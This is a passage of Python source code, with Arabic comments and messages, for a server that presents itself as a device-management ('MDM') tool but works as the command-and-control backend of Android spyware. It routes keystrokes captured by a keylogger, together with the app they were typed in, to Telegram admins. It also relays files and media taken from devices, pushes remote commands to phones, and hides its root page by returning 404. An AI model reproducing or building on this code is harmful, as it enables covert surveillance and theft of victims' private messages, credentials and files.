                bot.edit_message_text(text, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action == "devices":
                devs = self.dm.get_all_devices()
                if not devs:
                    bot.answer_callback_query(c.id, "لا توجد أجهزة", show_alert=True)
                    return
                header = f"<b>📋 كل الأجهزة</b> ({len(devs)})\n\nاضغط على جهاز للتحكم:"
                kb = _devices_list_kb(devs, prefix="devices")
                bot.edit_message_text(header, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action in ("online", "devices", "banned") and len(parts) >= 4 and parts[2] == "select":
                did = parts[3]
                dev = self.dm.get_device(did)
                if not dev:
                    bot.answer_callback_query(c.id, "الجهاز غير موجود", show_alert=True)
                    return
                text = _format_device_card(dev)
                kb = control_panel_keyboard(did, dev.get("banned", False))
                bot.edit_message_text(text, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

            elif action in ("online", "devices", "banned") and len(parts) >= 3 and parts[2] == "page":
                page = int(parts[3])
                if action == "online":
                    devs = self.dm.get_online_devices()
                    header = f"<b>🟢 الأجهزة المتصلة</b> ({len(devs)})\n\nاضغط على جهاز:"
                    prefix = "online"
                elif action == "banned":
                    devs = self.dm.get_banned_devices()
                    header = f"<b>⛔ الأجهزة المحظورة</b> ({len(devs)})\n\nاضغط على جهاز:"
                    prefix = "banned"
                else:
                    devs = self.dm.get_all_devices()
                    header = f"<b>📋 كل الأجهزة</b> ({len(devs)})\n\nاضغط على جهاز:"
                    prefix = "devices"
                kb = _devices_list_kb(devs, page=page, prefix=prefix)
                bot.edit_message_text(header, cid, mid, parse_mode="HTML", reply_markup=kb)
                bot.answer_callback_query(c.id)

        # ── معالج أزرار لوحة التحكم (للأجهزة) ──
        @bot.callback_query_handler(func=lambda c: not c.data.startswith("menu:") and ":" in c.data)
        def _cq(c: CallbackQuery):
            if not self._ok(c.from_user.id):
                bot.answer_callback_query(c.id, "⛔")
                return
            p = c.data.split(":", 2)
            a, did, tgt = p[0], p[1] if len(p) > 1 else "", p[2] if len(p) > 2 else ""

            if a == "kb":
                fn = _KB.get(tgt)
                if not fn:
                    return
                if tgt == "control_panel":
                    dev = self.dm.get_device(did)
                    kb = control_panel_keyboard(did, banned=dev.get("banned", False) if dev else False)
                else:
                    kb = fn(did)
                dev = self.dm.get_device(did)
                text = _format_category_header(tgt, dev)
                bot.edit_message_text(text, c.message.chat.id, c.message.message_id,
                                       reply_markup=kb, parse_mode="HTML")
                bot.answer_callback_query(c.id)

            elif a == "cmd":
                self._send_cmd(c.message.chat.id, did, tgt)
                bot.answer_callback_query(c.id, "⚡ تم الإرسال")

            elif a == "param":
                self._pending[c.message.chat.id] = {"device_id": did, "command": tgt}
                ci = COMMANDS.get(tgt, {})
                bot.answer_callback_query(c.id)
                bot.send_message(c.message.chat.id,
                    f"<b>📩 إدخال معامل</b>\n\n"
                    f"⚙ <b>{ci.get('label', tgt)}</b>\n"
                    f"💡 <code>{ci.get('param_hint', '')}</code>\n\n"
                    f"/cancel للإلغاء",
                    parse_mode="HTML")

            elif a == "ban":
                self.dm.ban_device(did, reason="حظر من البوت")
                self._kick(did)
                bot.answer_callback_query(c.id, "⛔ تم الحظر")
                self._refresh(c, did)

            elif a == "unban":
                self.dm.unban_device(did)
                bot.answer_callback_query(c.id, "✅ تم إلغاء الحظر")
                self._refresh(c, did)

            elif a == "kick":
                self._kick(did)
                bot.answer_callback_query(c.id, "🔌 تم الطرد")
                self._refresh(c, did)

            elif a == "delete":
                self._kick(did)
                self.dm.delete_device(did)
                bot.answer_callback_query(c.id, "🗑 تم الحذف")
                bot.edit_message_text(
                    "<b>🗑 تم حذف الجهاز</b>\n\nاختر جهازاً آخر أو عد للرئيسية.",
                    c.message.chat.id, c.message.message_id,
                    reply_markup=InlineKeyboardMarkup(row_width=1).add(_home_btn()),
                    parse_mode="HTML"
                )

            elif a == "info_act":
                dev = self.dm.get_device(did)
                if dev:
                    bot.send_message(c.message.chat.id, _format_device_card(dev), parse_mode="HTML")
                bot.answer_callback_query(c.id)

        @bot.message_handler(commands=["cancel"])
        def _cc(m):
            self._pending.pop(m.chat.id, None)
            bot.reply_to(m, "✅ تم الإلغاء.")

        @bot.message_handler(func=lambda m: True)
        @MDMBot._guard
        def _t(m):
            cid = m.chat.id
            text = m.text.strip()

            # Handle pending parameter input
            if cid in self._pending:
                p = self._pending[cid]
                if "device_id" in p and "command" in p:
                    did = p["device_id"]
                    cmd = p["command"]
                    self._pending.pop(cid)
                    self._send_cmd(cid, did, cmd, text)
                    return

            # Direct device_id input
            did = text
            dev = self.dm.get_device(did)
            if not dev:
                bot.reply_to(m, f"❌ الجهاز <code>{did}</code> غير موجود.", parse_mode="HTML")
                return
            card_text = _format_device_card(dev)
            kb = control_panel_keyboard(did, dev.get("banned", False))
            kb.add(_home_btn())
            bot.send_message(cid, card_text, reply_markup=kb, parse_mode="HTML")

    def _send_cmd(self, cid, did, command, params=None):
        payload = build_command_payload(command, params)
        if not payload:
            self.bot.send_message(cid, "❌ أمر غير معروف.")
            return

        dev = self.dm.get_device(did)
        if not dev:
            self.bot.send_message(cid, "❌ <b>الجهاز غير مسجل</b>", parse_mode="HTML")
            return

        short_label = _dev_label(dev)
        lbl = COMMANDS.get(command, {}).get("label", command)

        # ⚡ INSTANT PUSH via Socket.IO
        sid = dev.get("sid")
        if sid and self.socketio:
            try:
                self.socketio.emit("command", payload, room=sid)
                _pending_cmds[sid] = {"cid": cid, "command": command, "device_id": did, "timestamp": time.time()}
                self.bot.send_message(cid, _format_cmd_sent(dev, command, params), parse_mode="HTML")
                logger.info(f"[Push] أمر فوري: {command} → #{dev['short_id']}")
            except Exception as e:
                logger.error(f"[Push] فشل الإرسال: {e}")
                self.bot.send_message(cid, f"❌ <b>فشل الإرسال</b>\n\n📱 {short_label}\n⚠ {e}", parse_mode="HTML")
        else:
            self.bot.send_message(cid,
                f"🔴 <b>الجهاز غير متصل</b>\n\n"
                f"📱 {short_label}\n"
                f"⚙ {lbl}\n\n"
                f"💡 الجهاز يحتاج أن يكون متصلاً لاستقبال الأوامر.",
                parse_mode="HTML"
            )

    def _kick(self, did):
        sid = self.dm.get_sid_for_device(did)
        if sid and self.socketio:
            try:
                self.socketio.emit("force_disconnect", {"reason": "kicked"}, room=sid)
                self.socketio.server.disconnect(sid)
            except Exception:
                pass

    def _refresh(self, c, did):
        dev = self.dm.get_device(did)
        if not dev:
            self.bot.edit_message_reply_markup(c.message.chat.id, c.message.message_id)
            return
        text = _format_device_card(dev)
        kb = control_panel_keyboard(did, dev.get("banned", False))
        self.bot.edit_message_text(text, c.message.chat.id, c.message.message_id, reply_markup=kb, parse_mode="HTML")

    def setup_webhook(self):
        server_url = Config.SERVER_URL
        if not server_url:
            logger.warning("SERVER_URL not set - cannot setup webhook")
            return
        webhook_url = f"{server_url}/bot/webhook"
        try:
            self.bot.delete_webhook(drop_pending_updates=True)
            self.bot.set_webhook(url=webhook_url, allowed_updates=["message", "callback_query"])
            logger.info(f"Webhook configured: {webhook_url}")
        except Exception as e:
            logger.error(f"Webhook setup failed: {e}")

    def process_update(self, update_data):
        """Process a Telegram update using gevent for async compatibility"""
        def _process():
            try:
                update = telebot.types.Update.de_json(update_data)
                self.bot.process_new_updates([update])
            except Exception as e:
                logger.error(f"Error processing update: {e}")
        eventlet.spawn(_process)


def _devices_list_kb(devices, page=0, per_page=5, prefix="menu"):
    kb = InlineKeyboardMarkup(row_width=1)
    start = page * per_page
    end = start + per_page
    page_devs = devices[start:end]
    for d in page_devs:
        se = _dev_status_emoji(d)
        ago = _time_ago(d.get("last_seen"))
        label = f"{se} #{d['short_id']} {d.get('model', '?')} — {ago}"
        kb.add(InlineKeyboardButton(label, callback_data=f"{prefix}:select:{d['device_id']}"))
    total_pages = max(1, (len(devices) + per_page - 1) // per_page)
    nav = []
    if page > 0:
        nav.append(InlineKeyboardButton("→ السابق", callback_data=f"{prefix}:page:{page - 1}"))
    nav.append(InlineKeyboardButton("🏠 الرئيسية", callback_data="menu:home"))
    if page < total_pages - 1:
        nav.append(InlineKeyboardButton("التالي ←", callback_data=f"{prefix}:page:{page + 1}"))
    kb.add(*nav)
    return kb


# ═══════════════════════════════════════════════════════════════════════
# 8. FLASK APP + CRYPTO + REST API
# ═══════════════════════════════════════════════════════════════════════

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(name)s: %(message)s", datefmt="%Y-%m-%d %H:%M:%S")
logger = logging.getLogger("MDM-Server")

app = Flask(__name__)
app.config["SECRET_KEY"] = Config.SECRET_KEY or Config.E2E_KEY

# Socket.IO with EIO v3 compatibility
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet",
                    ping_timeout=60, ping_interval=25)

# ── EIO v3 Compatibility Middleware ──
_original_wsgi_app = app.wsgi_app

def _eio_v3_middleware(environ, start_response):
    qs = environ.get("QUERY_STRING", "")
    if "EIO=3" in qs:
        environ = dict(environ)
        environ["QUERY_STRING"] = qs.replace("EIO=3", "EIO=4")
        logger.debug("EIO v3 → v4 query rewrite for Android client")
    return _original_wsgi_app(environ, start_response)

app.wsgi_app = _eio_v3_middleware
logger.info("EIO v3 compatibility middleware activated")

dm = DeviceStore()
logger.info("تم تهيئة مخزن الأجهزة (في الذاكرة)")

mdm_bot = None
if Config.BOT_TOKEN and ":" in Config.BOT_TOKEN:
    try:
        mdm_bot = MDMBot(dm, socketio)
        me = mdm_bot.bot.get_me()
        logger.info(f"تم تهيئة البوت: @{me.username} (ID: {me.id})")
    except Exception as e:
        logger.error(f"فشل تهيئة البوت: {e}")
        mdm_bot = None
else:
    logger.warning("البوت غير متاح - تأكد من BOT_TOKEN")


# ── Crypto Session Store ──
_sessions: dict[str, dict] = {}

# ── Socket.IO Push Command Tracking ──
_pending_cmds: dict[str, dict] = {}  # sid -> {cid, command, device_id}

def _derive_key(e2e_key, device_id, salt="mdm-e2e"):
    m = hmac.new(e2e_key.encode(), f"{device_id}:{salt}".encode(), hashlib.sha256).digest()
    return m[:32], m[16:32]

def _check_access():
    if not Config.LIVE_ACCESS_KEY: return True
    k = request.headers.get("X-Access-Key") or request.args.get("key", "")
    return hmac.compare_digest(k, Config.LIVE_ACCESS_KEY)


# ── Security Middleware ──
@app.before_request
def _security():
    p = request.path
    if p == "/" or p.startswith("/socket.io/") or p.startswith(("/ping", "/init", "/health", "/api/device/upload-media")): return None
    if p.startswith("/api/device/"): return None
    if p.startswith(("/renew", "/data", "/api/")):
        if not _check_access(): return jsonify({"success": False, "error": "unauthorized"}), 401


# ── Web Endpoints ──
@app.route("/")
def _index():
    # Dashboard is disabled - return 404 to hide the server
    return make_response("Not Found", 404)

@app.route("/ping")
def _ping():
    return jsonify({"status": "alive", "timestamp": datetime.now(timezone.utc).isoformat(),
                     "active_key_sessions": len(_sessions), "version": "7.0.0"}), 200

@app.route("/init", methods=["GET"])
def _init():
    did = request.args.get("device_id", "").strip()
    if not did: return jsonify({"success": False, "error": "device_id مطلوب"}), 400
    if not Config.E2E_KEY: return jsonify({"success": False, "error": "E2E_KEY غير مضبوط"}), 500
    key, iv = _derive_key(Config.E2E_KEY, did)
    now = time.time()
    _sessions[did] = {"created_at": now, "renewed_at": now, "renew_count": 0}
    return jsonify({"success": True, "device_id": did, "key": key.hex(), "iv": iv.hex(),
                     "algorithm": "AES-256-CBC", "key_length": 256,
                     "session_created": datetime.fromtimestamp(now, tz=timezone.utc).isoformat()}), 200

@app.route("/renew", methods=["POST"])
def _renew():
    did = request.args.get("device_id", "").strip()
    if not did: return jsonify({"success": False, "error": "device_id مطلوب"}), 400
    s = _sessions.get(did)
    if not s: return jsonify({"success": False, "error": "استخدم /init أولاً"}), 404
    salt = f"mdm-e2e-{s.get('renew_count', 0) + 1}"
    key, iv = _derive_key(Config.E2E_KEY, did, salt)
    now = time.time()
    s["renewed_at"] = now; s["renew_count"] = s.get("renew_count", 0) + 1
    return jsonify({"success": True, "renew_count": s["renew_count"], "key": key.hex(), "iv": iv.hex(),
                     "algorithm": "AES-256-CBC",
                     "renewed_at": datetime.fromtimestamp(now, tz=timezone.utc).isoformat()}), 200

@app.route("/data", methods=["POST"])
def _data():
    did = request.args.get("device_id", "").strip()
    if not did: return jsonify({"success": False, "error": "device_id مطلوب"}), 400
    f = request.files.get("file")
    meta = request.form.get("metadata", "")
    if f: data, name = f.read(), f.filename
    elif request.data: data, name = request.data, None
    else: return jsonify({"success": False, "error": "لا بيانات"}), 400
    d = os.path.join("uploads", did); os.makedirs(d, exist_ok=True)
    sn = name or f"{uuid.uuid4().hex}.enc"; sp = os.path.join(d, sn)
    with open(sp, "wb") as fh: fh.write(data)
    return jsonify({"success": True, "file": sn, "size": len(data)}), 200


# ── Media Upload → Forward to Telegram Bot ──
@app.route("/api/device/upload-media", methods=["POST"])
def _api_upload_media():
    """Receive file from device and forward directly to Telegram bot as media"""
    did = request.form.get("device_id", "") or request.args.get("device_id", "")
    command = request.form.get("command", "")
    file_type = request.form.get("file_type", "document")

    if not did:
        return jsonify({"success": False, "error": "device_id required"}), 400

    f = request.files.get("file")
    if not f:
        return jsonify({"success": False, "error": "no file"}), 400

    upload_dir = os.path.join("uploads", did)
    os.makedirs(upload_dir, exist_ok=True)
    filename = f.filename or f"{command}_{int(time.time())}"
    filepath = os.path.join(upload_dir, filename)
    file_data = f.read()
    with open(filepath, "wb") as fh:
        fh.write(file_data)

    dev = dm.get_device(did)
    short_label = _dev_label(dev) if dev else did
    lbl = COMMANDS.get(command, {}).get("label", command)
    caption = f"📥 <b>نتيجة الأمر</b>\n\n📱 <b>{short_label}</b>\n⚙ {lbl}\n━━━━━━━━━━━━━━━\n"

    if mdm_bot:
        for admin_id in Config.ADMIN_IDS:
            try:
                if file_type == "photo":
                    mdm_bot.bot.send_photo(admin_id, photo=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                elif file_type == "video":
                    mdm_bot.bot.send_video(admin_id, video=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                elif file_type == "audio":
                    mdm_bot.bot.send_audio(admin_id, audio=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                else:
                    mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال ملف للبوت: {e}")
                try:
                    mdm_bot.bot.send_document(admin_id, document=open(filepath, "rb"), caption=caption, parse_mode="HTML")
                except Exception as e2:
                    logger.error(f"فشل إرسال مستند: {e2}")

    logger.info(f"[Media] ملف من #{dev.get('short_id', '?') if dev else '?'}: {filename} ({file_type})")
    return jsonify({"success": True, "file": filename, "size": len(file_data)}), 200

@app.route("/keys", methods=["GET"])
def _keys():
    # Disabled for security - return 404
    return make_response("Not Found", 404)

@app.route("/health", methods=["GET"])
def _health():
    return jsonify({"status": "ok", "devices": dm.get_stats(),
                     "version": "7.0.0"}), 200

@app.route("/debug", methods=["GET"])
def _debug():
    # Disabled for security - return 404
    return make_response("Not Found", 404)


# ═══════════════════════════════════════════════════════════════════════
# 9. REST API FOR ANDROID APP (Minimal - Socket.IO is PRIMARY)
# ═══════════════════════════════════════════════════════════════════════

@app.route("/api/device/register", methods=["POST"])
def _api_device_register():
    data = request.json or {}
    did = data.get("device_id", "")
    if not did:
        return jsonify({"success": False, "error": "device_id required"}), 400

    existing = dm.get_device(did)
    if existing and existing.get("banned"):
        return jsonify({"success": False, "error": "device banned", "banned": True}), 403

    extra_info = data.get("extra_info")
    if isinstance(extra_info, dict):
        import json as _json
        extra_info = _json.dumps(extra_info)

    result = {
        "success": True,
        "short_id": existing["short_id"] if existing else None,
        "message": "سجّل عبر Socket.IO الآن",
        "server_time": datetime.now(timezone.utc).isoformat()
    }

    if Config.LIVE_ACCESS_KEY:
        result["access_key"] = Config.LIVE_ACCESS_KEY
    if Config.E2E_KEY:
        key, iv = _derive_key(Config.E2E_KEY, did)
        result["e2e"] = {"key": key.hex(), "iv": iv.hex(), "algorithm": "AES-256-CBC"}
        if did not in _sessions:
            now = time.time()
            _sessions[did] = {"created_at": now, "renewed_at": now, "renew_count": 0}

    logger.info(f"[REST] تسجيل مبدئي: {did}")
    return jsonify(result), 200


@app.route("/api/device/response", methods=["POST"])
def _api_device_response():
    data = request.json or {}
    did = data.get("device_id", "")
    cmd = data.get("command", "?")
    status = data.get("status", "?")
    logger.info(f"[REST-fallback] استجابة: {did} cmd={cmd} status={status}")

    if mdm_bot and did:
        dev = dm.get_device(did)
        cid = _pending_cmds.pop(did, {}).get("cid")
        if cid and dev:
            try:
                text = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
                mdm_bot.bot.send_message(cid, text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال الاستجابة: {e}")

    return jsonify({"success": True}), 200


# ── REST API ──
@app.route("/api/devices", methods=["GET"])
def _api_devs():
    return jsonify({"success": True, "devices": list(dm._devices.values())}), 200

@app.route("/api/devices/<did>", methods=["GET"])
def _api_dev(did):
    d = dm.get_device(did)
    return jsonify({"success": True, "device": d}) if d else (jsonify({"success": False, "error": "غير موجود"}), 404)

@app.route("/api/devices/<did>/ban", methods=["POST"])
def _api_ban(did):
    r = request.json.get("reason") if request.is_json else None
    ok, m = dm.ban_device(did, reason=r)
    if ok and mdm_bot: mdm_bot._kick(did)
    return (jsonify({"success": True, "message": m}), 200) if ok else (jsonify({"success": False, "error": m}), 404)

@app.route("/api/devices/<did>/unban", methods=["POST"])
def _api_unban(did):
    ok, m = dm.unban_device(did)
    return (jsonify({"success": True, "message": m}), 200) if ok else (jsonify({"success": False, "error": m}), 404)

@app.route("/api/stats", methods=["GET"])
def _api_stats():
    return jsonify({"success": True, "stats": dm.get_stats()}), 200

@app.route("/api/devices/<did>/command", methods=["POST"])
def _api_cmd(did):
    if not request.is_json: return jsonify({"success": False, "error": "JSON مطلوب"}), 400
    cmd = request.json.get("command", ""); params = request.json.get("params")
    if not cmd: return jsonify({"success": False, "error": "command مطلوب"}), 400
    payload = build_command_payload(cmd, params)
    if not payload: return jsonify({"success": False, "error": f"غير معروف: {cmd}"}), 400
    sid = dm.get_sid_for_device(did)
    if sid and socketio:
        try:
            socketio.emit("command", payload, room=sid)
            return jsonify({"success": True, "command": cmd, "device_id": did, "method": "socket_push"}), 200
        except Exception as e:
            return jsonify({"success": False, "error": str(e)}), 500
    return jsonify({"success": False, "error": "device not connected via Socket.IO"}), 404

@app.route("/api/commands", methods=["GET"])
def _api_cmds():
    result = []
    for ck, ci in CATEGORIES.items():
        result.append({"category": ck, "label": ci["label"],
                        "commands": [{"type": c, "label": COMMANDS[c]["label"],
                                       "description": COMMANDS[c]["description"],
                                       "needs_param": COMMANDS[c]["needs_param"]}
                                      for c in get_commands_by_category(ck)]})
    return jsonify({"success": True, "categories": result}), 200


# ═══════════════════════════════════════════════════════════════════════
# 10. SOCKET.IO EVENTS
# ═══════════════════════════════════════════════════════════════════════

@socketio.on("connect")
def _sock_connect():
    logger.info(f"اتصال: SID={request.sid}")

@socketio.on("disconnect")
def _sock_disconnect():
    logger.info(f"قطع: SID={request.sid}"); dm.handle_disconnect(request.sid)

@socketio.on("register")
def _sock_register(data):
    did = data.get("device_id", "")
    if not did: emit("error", {"message": "device_id مطلوب"}); disconnect(); return
    dev, is_new, msg = dm.register_or_update(did, request.sid, data.get("model"), data.get("version"), data.get("ip"), data.get("extra_info"))
    if dev.get("banned"):
        emit("banned", {"message": "محظور", "reason": dev.get("ban_reason")}); disconnect(); return
    reg_data = {"status": "registered" if is_new else "updated", "message": msg,
         "heartbeat_interval": 30, "server_time": dev["last_seen"].isoformat(),
         "short_id": dev["short_id"]}
    if Config.LIVE_ACCESS_KEY:
        reg_data["access_key"] = Config.LIVE_ACCESS_KEY
    if Config.E2E_KEY:
        key, iv = _derive_key(Config.E2E_KEY, did)
        reg_data["e2e"] = {"key": key.hex(), "iv": iv.hex(), "algorithm": "AES-256-CBC"}
        if did not in _sessions:
            now = time.time()
            _sessions[did] = {"created_at": now, "renewed_at": now, "renew_count": 0}
    emit("registered", reg_data)
    logger.info(f"[Socket] {'جديد' if is_new else 'تحديث'} #{dev['short_id']} {did} | {dev.get('model')} | {dev.get('ip')}")

    # Notify bot if new device
    if is_new and mdm_bot:
        eventlet.spawn(mdm_bot._notify_device_connect, dev)

@socketio.on("heartbeat")
def _sock_heartbeat(_):
    d = dm.handle_heartbeat(request.sid)
    if d: emit("heartbeat_ack", {"status": "ok", "server_time": d["last_seen"].isoformat()})

@socketio.on("command_response")
def _sock_cmd_resp(data):
    dev = dm.get_device_by_sid(request.sid)
    sid = request.sid
    if dev:
        cmd = data.get("command", "?")
        status = data.get("status", "?")
        logger.info(f"[Socket] استجابة: #{dev.get('short_id', '?')} cmd={cmd} status={status}")
        pending = _pending_cmds.pop(sid, None)
        if pending and mdm_bot:
            cid = pending["cid"]
            try:
                text = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
                mdm_bot.bot.send_message(cid, text, parse_mode="HTML")
            except Exception as e:
                logger.error(f"فشل إرسال الاستجابة: {e}")


@socketio.on("file_explorer_data")
def _sock_file_explorer(data):
    """Handle file explorer data responses from devices.
    
    The Android app emits this event when sending file listing / file content
    results back to the server in response to file explorer commands.
    """
    dev = dm.get_device_by_sid(request.sid)
    if not dev:
        logger.warning(f"[Socket] file_explorer_data from unknown SID={request.sid}")
        return

    # Check for keylog event
    data_type = data.get("type", "")
    if data_type == "keylog":
        _handle_keylog_event(dev, data)
        return
    
    cmd = data.get("command", "?")
    status = data.get("status", "?")
    logger.info(f"[Socket] استكشاف ملفات: #{dev.get('short_id', '?')} cmd={cmd} status={status}")

    pending = _pending_cmds.get(request.sid)
    if pending and mdm_bot:
        cid = pending["cid"]
        try:
            text = _format_cmd_result(dev, cmd, status, data.get("data"), data.get("error"))
            mdm_bot.bot.send_message(cid, text, parse_mode="HTML")
        except Exception as e:
            logger.error(f"فشل إرسال نتائج file explorer: {e}")



def _handle_keylog_event(dev, data):
    """Process keylogger data and forward to Telegram bot."""
    try:
        package = data.get("package", "unknown")
        text = data.get("text", "")
        
        if not text:
            return
        
        short_id = dev.get('short_id', '?')
        logger.info(f"⌨️ [Keylog] #{short_id} [{package}]: {text[:100]}")
        
        # Get app name
        app_name = _get_app_name(package) if '_get_app_name' in globals() else package
        
        if mdm_bot:
            display_text = text[:500]
            if len(text) > 500:
                display_text += "..."
            
            msg = (
                f"⌨️ <b>تسجيل لوحة المفاتيح</b>\n\n"
                f"📱 <b>الجهاز:</b> #{short_id}\n"
                f"📱 <b>التطبيق:</b> {app_name}\n"
                f"📝 <b>النص:</b>\n"
                f"<code>{display_text}</code>\n\n"
                f"🕐 <b>الوقت:</b> {datetime.now(timezone.utc).strftime('%H:%M:%S')}"
            )
            
            for admin_id in Config.ADMIN_IDS:
                try:
                    mdm_bot.bot.send_message(admin_id, msg, parse_mode="HTML")
                except Exception as e:
                    logger.error(f"فشل إرسال keylog للبوت: {e}")
    except Exception as e:
        logger.error(f"خطأ في معالجة keylog: {e}")


# ── Telegram Webhook Endpoint ──
@app.route("/bot/webhook", methods=["POST"])
def _bot_webhook():
    if not mdm_bot:
        return jsonify({"error": "bot not configured"}), 503
    update_data = request.json
    mdm_bot.process_update(update_data)
    return jsonify({"ok": True}), 200

@app.route("/bot/setup", methods=["GET"])
def _bot_setup():
    if not mdm_bot:
        return jsonify({"error": "bot not configured"}), 503
    mdm_bot.setup_webhook()
    return jsonify({"ok": True, "message": "webhook configured"}), 200


# ═══════════════════════════════════════════════════════════════════════
# 11. BACKGROUND LOOPS
# ═══════════════════════════════════════════════════════════════════════

def _cleanup():
    while True:
        time.sleep(60)
        try:
            c = dm.cleanup_stale(Config.HEARTBEAT_TIMEOUT)
            if c: logger.info(f"تنظيف: {c} → أوفلاين")
        except: pass

def _keepalive():
    """إبقاء السيرفر مستيقظ عبر زيارة نفسه كل 4 دقائق"""
    import urllib.request
    time.sleep(30)
    server_url = Config.SERVER_URL
    if not server_url:
        logger.warning("متغير SERVER_URL غير مضبوط - لن يتم إبقاء السيرفر مستيقظاً")
        return
    ping_url = server_url.rstrip("/") + "/ping"
    logger.info(f"تمكين الإبقاء المستيقظ كل 4 دقائق → {ping_url}")
    while True:
        try:
            urllib.request.urlopen(ping_url, timeout=15)
            logger.info(f"keepalive: تم الزيارة بنجاح {datetime.now(timezone.utc).strftime('%H:%M:%S')}")
        except Exception as e:
            logger.warning(f"keepalive: فشل الزيارة - {e}")
        time.sleep(240)


# ═══════════════════════════════════════════════════════════════════════
# 12. MAIN
# ═══════════════════════════════════════════════════════════════════════

def main():
    errors = Config.validate()
    for e in errors:
        logger.warning(f"متغير مفقود: {e}")
    if not Config.BOT_TOKEN:
        logger.warning("BOT_TOKEN غير مضبوط - البوت لن يعمل")
    if errors:
        logger.warning(f"عدد المتغيرات المفقودة: {len(errors)} - السيرفر سيعمل لكن بعض الميزات معطلة")

    logger.info(f"MDM Server v7.0 جاري التشغيل على المنفذ {Config.PORT}")
    eventlet.spawn(_cleanup)
    eventlet.spawn(_keepalive)
    if mdm_bot:
        mdm_bot.setup_webhook()
        logger.info("تم تشغيل البوت بالـ webhook")

    socketio.run(app, host="0.0.0.0", port=Config.PORT, debug=False, use_reloader=False)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        logger.critical(f"فشل التشغيل: {type(e).__name__}: {e}", exc_info=True)
        sys.exit(1)
